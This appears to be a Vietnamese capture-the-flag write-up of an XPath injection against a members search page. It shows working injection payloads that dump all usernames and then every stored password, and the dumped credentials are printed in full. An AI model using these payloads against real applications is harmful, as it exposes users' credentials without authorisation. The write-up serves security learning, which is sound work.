Như thường lệ, chúng ta sẽ không thử ở trang login mà sẽ inject ở trang tìm kiếm members 

Nhập thử chữ `a` vào input:

> 2 results
>
> - Harry
> - Maxim

Vậy có vẻ đây là nơi tìm kiếm username của những thành viên có chứa chữ trong ô input. Thử inject bằng cách nhập dấu `'`:

> Error during search, invalid XPath syntax : //user/username[contains(., ''')]

Ok, câu truy vấn đã rõ: nó gọi hàm `contains` trong childnode `username` trong node `user`, giờ thử với payloads sau:

`')] |  //user/username[contains(.,'`

kết quả trả về:

> 5 results
>
> - Bob
> - Harry
> - Alex
> - Maxim
> - Lory

không có tài khoản nào nhìn giống tài khoản `admin`, hơi lạ. Tìm hint trên mạng, hóa ra tài khoản `admin` không tên là 'admin', vậy mình cứ truy vấn ra hết password xem cái nào có cấu trúc giống rootme nhất thôi! Payloads: `')] |  //user/password[contains(.,'`

kết quả:

>  10 results
>
> - Bob
> - 123456dsrtg
> - Harry
> - MB5PRCvfOXiYejMcmNTI
> - Alex
> - ezlolsdf
> - Maxim
> - 346DFE364
> - Lory
> - jsehrf6325

tài khoản Harry có mật khẩu khả nghi nhất.